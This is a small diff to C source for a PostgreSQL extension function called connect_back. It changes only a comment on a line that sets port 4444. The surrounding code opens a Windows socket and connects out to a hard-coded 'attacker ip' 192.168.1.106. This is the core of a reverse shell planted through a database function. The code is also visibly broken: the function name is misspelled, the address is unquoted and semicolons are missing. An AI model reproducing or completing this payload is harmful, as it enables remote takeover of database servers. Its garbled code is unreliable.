@@ -37,7 +37,7 @@ connect_back(PG_FUNCTION_ARGS)
 	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 
 	hax.sin_family = AF_INET;
-	hax.sin_port = htons(4444) /* attacker port*
+	hax.sin_port = htons(4444) /* attacker port */
 	hax.sin_addr.s_addr = inet_adrr(192.168.1.106) /* attacker ip */
 	
 	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
